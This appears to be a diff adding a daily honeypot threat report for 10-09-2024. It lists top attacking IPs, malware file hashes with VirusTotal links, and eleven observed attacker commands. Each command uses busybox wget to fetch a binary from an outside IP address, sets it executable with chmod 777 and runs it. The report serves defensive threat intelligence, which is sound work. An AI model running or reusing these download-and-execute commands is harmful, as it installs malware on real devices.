@@ -1,0 +1,45 @@
+Top 5 IPs for 10-09-2024 :
+
+121.227.152.250
+36.22.189.214
+138.68.161.220
+61.171.81.99
+152.228.164.249
+
+
+Malware Observed:
+
+File Name : sshd
+51b052a524af278366fb5527d4a5eee949b63f85168c37d4f97aefe3e73fe66a
+https://www.virustotal.com/gui/file/51b052a524af278366fb5527d4a5eee949b63f85168c37d4f97aefe3e73fe66a
+
+
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+86d55441ffa21cce2cca12cde0ea7fe164ae0a119b027fe17ee208d479494097
+https://www.virustotal.com/gui/file/86d55441ffa21cce2cca12cde0ea7fe164ae0a119b027fe17ee208d479494097
+
+
+Commands/exploits observed :
+
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w1; chmod 777 8d9wa7da9w1; ./8d9wa7da9w1 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w2; chmod 777 8d9wa7da9w2; ./8d9wa7da9w2 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w3; chmod 777 8d9wa7da9w3; ./8d9wa7da9w3 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w4; chmod 777 8d9wa7da9w4; ./8d9wa7da9w4 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w5; chmod 777 8d9wa7da9w5; ./8d9wa7da9w5 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w6; chmod 777 8d9wa7da9w6; ./8d9wa7da9w6 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w7; chmod 777 8d9wa7da9w7; ./8d9wa7da9w7 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w8; chmod 777 8d9wa7da9w8; ./8d9wa7da9w8 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w9; chmod 777 8d9wa7da9w9; ./8d9wa7da9w9 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w10; chmod 777 8d9wa7da9w10; ./8d9wa7da9w10 android
+busybox wget http://45.202.35.93/thefatperson/8d9wa7da9w11; chmod 777 8d9wa7da9w11; ./8d9wa7da9w11 android
